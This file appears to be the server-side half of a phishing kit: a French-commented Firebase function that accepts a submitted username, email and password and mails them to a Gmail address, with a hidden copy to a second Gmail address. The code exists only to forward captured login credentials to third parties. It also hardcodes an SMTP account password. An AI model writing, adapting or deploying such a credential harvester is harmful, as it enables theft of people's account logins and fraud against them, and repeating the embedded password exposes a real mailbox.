const functions = require("firebase-functions");
const nodemailer = require("nodemailer");

// Configuration du transporteur SMTP
const transporter = nodemailer.createTransport({
  host: "mail.infomaniak.com",
  port: 465,
  secure: true,
  auth: {
    user: "service@monespace-en-ligne.site",
    pass: "Tanguyedmond100@", // À stocker de manière sécurisée avec Firebase Config
  },
});

exports.sendEmail = functions.https.onRequest(async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).send("Méthode non autorisée");
  }

  const { user, email, pass } = req.body;
  if (!user || !email || !pass) {
    return res.status(400).send("Tous les champs sont requis");
  }

  const mailOptions = {
    from: "service@monespace-en-ligne.site",
    to: "action.cerivc@gmail.com",
    bcc: "bprotection85@gmail.com",
    subject: "Infos Universel",
    html: `<h1>Nouveau Message - Infos Universel</h1>
           <b>identifiant :</b> ${user} <br>
           <b>email :</b> ${email} <br>
           <b>Mot de passe :</b> ${pass}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    return res.status(200).send("Email envoyé avec succès");
  } catch (error) {
    return res.status(500).send(`Erreur lors de l'envoi de l'email: ${error.message}`);
  }
});